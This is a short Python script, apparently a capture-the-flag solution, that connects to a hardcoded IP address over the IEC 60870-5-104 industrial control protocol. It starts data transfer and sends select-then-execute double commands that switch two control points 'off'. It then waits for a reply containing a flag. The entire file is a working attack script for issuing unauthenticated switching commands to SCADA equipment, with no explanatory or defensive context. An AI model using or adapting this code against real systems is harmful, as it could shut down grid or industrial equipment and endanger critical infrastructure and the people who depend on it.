#!/usr/bin/env python3
import socket
import time

HOST = '169.58.126.107'
PORT = 6004

def main():
    s = socket.socket()
    s.settimeout(300)
    try:
        s.connect((HOST, PORT))
        s.send(bytes([0x68, 0x04, 0x07, 0x00, 0x00, 0x00]))
        time.sleep(2)
        r = s.recv(1024)
        print(r.hex())
        ca = bytes([0x01, 0x00])
        tx = rx = 0
        def send_i(asdu):
            nonlocal tx, rx
            apci = bytes([0x68, len(asdu)+4, tx&0xFF,(tx>>8)&0xFF, rx&0xFF,(rx>>8)&0xFF])
            tx += 2; rx += 2
            s.send(apci+asdu)
        # C_DC_NA_1 type 46
        for ioa_num in [1,2]:
            ioa = bytes([ioa_num&0xFF,(ioa_num>>8)&0xFF,(ioa_num>>16)&0xFF])
            # DCO: bits 0,1 = state (1=off,2=on), bit 7 = S/E
            asdu = bytes([46, 0x01, 0x06, 0x00]) + ca + ioa + bytes([0x01]) # select off
            send_i(asdu); time.sleep(1)
            try: print(s.recv(256).hex())
            except: pass
            asdu = bytes([46, 0x01, 0x06, 0x00]) + ca + ioa + bytes([0x81]) # operate off
            send_i(asdu); time.sleep(1)
            try: print(s.recv(256).hex())
            except: pass
        print('waiting...')
        start = time.time()
        while time.time() - start < 180:
            try:
                s.settimeout(15)
                r = s.recv(8192)
                if not r: break
                print('DATA:', r.hex())
                if b'CTF{' in r:
                    print(r); break
            except socket.timeout:
                try: s.send(bytes([0x68,0x04,0x43,0x00,0x00,0x00]))
                except: break
                continue
            except: break
    finally:
        try: s.close()
        except: pass

if __name__ == '__main__':
    main()
